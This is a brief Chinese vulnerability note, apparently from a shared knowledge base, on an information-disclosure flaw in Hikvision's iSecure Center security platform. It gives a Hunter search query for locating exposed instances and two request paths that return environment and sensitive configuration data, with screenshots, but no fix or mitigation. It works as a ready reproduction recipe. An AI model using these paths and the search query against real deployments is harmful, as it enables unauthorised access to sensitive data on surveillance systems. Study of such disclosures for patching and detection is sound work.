# 海康威视iSecure Center综合安防管理平台 env 信息泄漏漏洞

# 一、漏洞简介
HIKVISION 综合安防管理平台存在信息泄漏漏洞，攻击者通过漏洞可以获取环境env等敏感信息进一步攻击。

# 二、影响版本
+ HIKVISION 综合安防管理平台

# 三、<font style="color:rgb(0, 0, 0);">资产测绘</font>
**hunter查询语法：**

`app.name=="Hikvision 海康威视 iSecure Center"`

![1691858054561-aa88559b-46e0-4837-ae4c-6f3e9e3982c5.png](./img/5PVxXecoDXiJN_Eu/1691858054561-aa88559b-46e0-4837-ae4c-6f3e9e3982c5-751749.png)

+ 登录页面

![1691858046745-db2cadc6-9bde-4037-952f-2faf2537b85f.png](./img/5PVxXecoDXiJN_Eu/1691858046745-db2cadc6-9bde-4037-952f-2faf2537b85f-764837.png)

# 四、漏洞复现
```plain
/artemis-portal/artemis/env 
```

![1691858136518-4966819b-3613-4ebc-8d53-8709141c80dc.png](./img/5PVxXecoDXiJN_Eu/1691858136518-4966819b-3613-4ebc-8d53-8709141c80dc-455276.png)

```plain
/artemis/env
```

![1699978989500-f123cba1-ae00-40f3-907f-7c9e9706db80.png](./img/5PVxXecoDXiJN_Eu/1699978989500-f123cba1-ae00-40f3-907f-7c9e9706db80-476150.png)



> 更新: 2024-02-29 23:57:18  
> 原文: <https://www.yuque.com/xiaokp7/ocvun2/swlt25g5lx4t9rg6>